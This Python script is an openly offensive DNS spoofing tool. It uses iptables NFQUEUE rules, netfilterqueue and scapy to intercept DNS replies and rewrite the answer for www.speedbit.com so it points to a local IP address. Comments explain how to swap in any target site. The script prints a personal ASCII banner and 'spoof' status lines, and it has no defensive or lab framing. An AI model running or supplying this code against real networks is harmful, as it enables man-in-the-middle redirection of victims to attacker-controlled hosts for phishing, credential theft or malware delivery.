#!/usr/bin/python3

# prereq iptables -I FORWARD -j NFQUEUE --queue-num 0 external machine
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 local machine
# iptables -I INPUT -j NFQUEUE --queue-num 0 local machine

import netfilterqueue
import scapy.all as scapy
import subprocess

logo = '''

 /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$                               /$$       /$$ /$$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$                              | $$      |__/| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$$| $$$$$$$  /$$| $$
| $$$$$$$$| $$$$$$$$| $$$$$$$$| $$$$$$$$ |____  $$ /$$__  $$ /$$_____/| $$__  $$| $$| $$
| $$__  $$| $$__  $$| $$__  $$| $$__  $$  /$$$$$$$| $$  \__/|  $$$$$$ | $$  \ $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$       \____  $$| $$  | $$| $$| $$
| $$  | $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$$| $$       /$$$$$$$/| $$  | $$| $$| $$
|__/  |__/|__/  |__/|__/  |__/|__/  |__/ \_______/|__/      |_______/ |__/  |__/|__/|__/

'''
print(logo)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.speedbit.com' in str(qname): # can change "" to any site you want to poison
            print("[+] Starting to Spoof Target: ")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.154.138") #rdata is the site you want to redirect to
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    while True:
        print("[+] Starting ARP Spoofer waiting to intercept packets from local host... (please flush IP Tables)")
        queue = netfilterqueue.NetfilterQueue() #net filter q object
        queue.bind(0, process_packet) #callback funciton to execute on each packet
        queue.run()
except KeyboardInterrupt:
    print("\n\n[x] Ending Program detected CTRL + C")

